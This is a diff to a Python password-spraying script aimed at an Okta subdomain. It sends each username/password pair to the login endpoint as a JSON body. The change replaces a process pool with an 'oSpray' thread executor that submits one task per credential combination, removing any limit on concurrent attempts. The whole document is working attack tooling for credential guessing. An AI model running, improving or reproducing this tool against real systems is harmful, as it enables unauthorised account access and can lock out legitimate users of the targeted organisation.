@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
 import requests
-import multiprocessing
+from concurrent.futures import ThreadPoolExecutor
 import argparse
 
 parser = argparse.ArgumentParser()
@@ -15,7 +15,6 @@ args = parser.parse_args()
 subdomain = args.subdomain.replace(".okta.com", "")
 
 def checkCreds(creds):
-    print("here")
     username, password = creds
     session = requests.Session()
     rawBody = "{\"username\":\"%s\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true},\"password\":\"%s\"}" % (username, password)
@@ -71,6 +70,12 @@ for password in passwords:
 del users
 del passwords
 
+def oSpray(tasks,max_workers):
+        with ThreadPoolExecutor(max_workers=max_workers) as executor: 
+            running_tasks = [executor.submit(task) for task in tasks]
+            for running_task in running_tasks:
+                running_task.result()
 
-pool = multiprocessing.Pool(args.threads)
-pool.map(checkCreds, combo)
+tasks = [lambda i=i: checkCreds(i) for i in combo]
+
+oSpray(tasks, len(tasks))
